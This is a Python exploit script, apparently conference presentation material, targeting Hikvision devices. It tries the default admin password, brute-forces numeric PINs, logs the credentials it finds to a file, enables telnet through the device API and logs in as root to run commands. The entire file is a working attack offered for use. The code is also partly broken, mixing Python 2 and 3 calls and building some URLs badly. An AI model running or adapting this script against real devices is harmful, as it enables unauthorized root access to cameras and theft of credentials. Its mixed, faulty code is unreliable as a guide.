#!/usr/bin/python
# BSidesMCR Presentation Material
# Exploit for Hikvision pin bruteforce
# Dominic Chell <dominic [at] mdsec.co.uk>
# Updated By Random_Robbie @random_robbie

from gevent import monkey
monkey.patch_all()

import sys
import time
import urllib2
import base64
import telnetlib
from random import randint
import gevent.pool

global password
global host

def do_brute(path):
    global password
    global host

    for i in range(0, 100000):  # use range instead of xrange for Python 3
        header = base64.b64encode(b"admin:" + str(i).encode()).decode()
        url = urllib2.Request("http://" + host + path + "/userCheck")
        url.add_header('Authorization', "Basic " + header)
        response = urllib2.urlopen(url)
        print("[*] Testing: %s" % i)
        if "<statusString>OK</statusString>" in response.read():
            password = str(i)
            print("[*] Found Password: %s:\n %s" % (i, response.read()))
            enable_telnetd(header, path)
            return

def do_default(host, path):
    global password
    header = base64.b64encode(b"admin:12345").decode()
    url = urllib2.Request("http://" + host + path + "/userCheck")
    url.add_header('Authorization', "Basic " + header)
    response = urllib2.urlopen(url)
    print("[*] Testing: 12345")
    if "<statusString>OK</statusString>" in response.read():
        password = "12345"
        print("[*] Found Password: 12345")
        enable_telnetd(header, path)
        return

def detect_system(host):
    try:
        url = urllib2.Request("http://" + host + "/PSIA/Custom/SelfExt")
        response = urllib2.urlopen(url)
    except urllib2.HTTPError as e:
        if e.code == 401:
            path = "/PSIA/Custom/SelfExt"
            print("[*] Newer Model")
            return path
        else:
            path = "/ISAPI/Security"
            print("[*] Older Model")
            return path

def enable_telnetd(header, path):
    global host
    try:
        with open("found.txt", "a") as text_file:
            login_details = base64.b64decode(header).decode()
            text_file.write("Host: " + host + " Combo: " + login_details + "\n")
        print("[*] Enabling telnetd")
        baseURL = "http://" + host + path + "Network/telnetd"
        data = '<?xml version="1.0" encoding="UTF-8"?><Telnetd><enabled>true</enabled></Telnetd>'
        request = urllib2.Request(baseURL, data.encode())
        request.add_header('Authorization', "Basic " + header)
        request.get_method = lambda: 'PUT'  # if I remove this line then the POST works fine.
        response = urllib2.urlopen(request)
    except urllib2.HTTPError as e:
        if e.code == 404:
            print("[*] This Model Does Not Support Telnet Sorry")
            exit()
        else:
            time.sleep(3)
            login_telnetd()

def login_telnetd():
    global password
    global host
    print("[*] Logging in to device")
    tn = telnetlib.Telnet(host)
    tn.read_until(b"dvrdvs login:")
    print("[*] Sending username 'root'")
    tn.write(b"root\n")
    tn.read_until(b"Password: ")
    print("[*] Sending password '" + password + "'")
    tn.write(password.encode() + b"\n")
    print("[*] Sending commands")
    tn.write(b"id;exit\n")
    print(tn.read_all().decode())

if __name__ == '__main__':
    global host
    global password
    if len(sys.argv) < 2:
        print("[*] Please supply IP of target")
        sys.exit()

    password = ""
    host = sys.argv[1]
    path = detect_system(host)
    do_default(host, path)
    do_brute(path)
